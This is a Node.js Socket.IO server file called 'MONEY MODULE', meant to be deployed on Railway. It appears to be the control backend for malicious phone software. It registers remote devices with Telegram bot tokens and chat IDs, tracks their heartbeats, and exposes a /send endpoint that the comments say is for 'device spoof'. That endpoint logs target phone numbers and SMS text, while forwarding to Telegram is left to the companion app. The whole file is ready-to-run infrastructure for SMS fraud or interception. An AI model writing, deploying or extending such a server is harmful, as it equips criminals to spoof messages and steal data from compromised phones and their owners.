/**
 * MONEY MODULE - Socket.IO Server
 * Deploy this on Railway
 * NOTE: Telegram forwarding is done by the app itself via handleSmsResult
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling'],
  pingTimeout: 120000,
  pingInterval: 30000,
  upgradeTimeout: 60000,
  allowUpgrades: true,
  connectTimeout: 60000,
  maxHttpBufferSize: 1e8
});

// Store connected devices
const connectedDevices = new Map();
const registeredDevices = new Map();

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'MONEY MODULE Server Running',
    connectedDevices: connectedDevices.size,
    registeredDevices: registeredDevices.size,
    uptime: process.uptime()
  });
});

app.use(express.json({ limit: '10mb' }));

// SMS Send endpoint - App calls this for device spoof
// NO Telegram forwarding here - app does it via handleSmsResult
app.post('/send', (req, res) => {
  try {
    const { deviceId, destNumber, textMessage } = req.body;
    
    console.log(`[SMS] Device: ${deviceId}, To: ${destNumber}`);
    console.log(`[SMS] Message: ${textMessage}`);
    
    // Just acknowledge - app handles Telegram via handleSmsResult
    res.json({
      status: "true",
      message: "SMS received"
    });
  } catch (error) {
    console.error('[SMS] Error:', error);
    res.status(500).json({
      status: "false",
      message: "Error"
    });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[CONNECT] ${socket.id}`);
  
  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
  const botToken = socket.handshake.auth?.botToken || '';
  const chatId = socket.handshake.auth?.chatId || '';
  
  console.log(`[AUTH] Device: ${deviceId}`);
  
  connectedDevices.set(socket.id, {
    deviceId,
    botToken,
    chatId,
    socketId: socket.id,
    connectedAt: new Date().toISOString()
  });
  
  if (deviceId && deviceId !== 'unknown') {
    registeredDevices.set(deviceId, {
      deviceId,
      botToken,
      chatId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    console.log(`[REGISTERED] ${deviceId}`);
    
    socket.emit('registered', {
      success: true,
      message: 'Device registered',
      deviceId: deviceId
    });
  }
  
  socket.emit('connected', {
    message: 'Connected',
    deviceId: deviceId,
    socketId: socket.id
  });
  
  socket.on('register', (data) => {
    const regDeviceId = data?.deviceId || deviceId;
    registeredDevices.set(regDeviceId, {
      deviceId: regDeviceId,
      botToken: data?.botToken || botToken,
      chatId: data?.chatId || chatId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    
    socket.emit('registered', {
      success: true,
      deviceId: regDeviceId
    });
  });
  
  socket.on('heartbeat', () => {
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
    socket.emit('heartbeat', { timestamp: Date.now() });
  });
  
  socket.on('disconnect', (reason) => {
    console.log(`[DISCONNECT] ${deviceId}: ${reason}`);
    connectedDevices.delete(socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('========================================');
  console.log('MONEY MODULE Server Started');
  console.log(`Port: ${PORT}`);
  console.log('========================================');
});

process.on('SIGTERM', () => {
  server.close(() => process.exit(0));
});
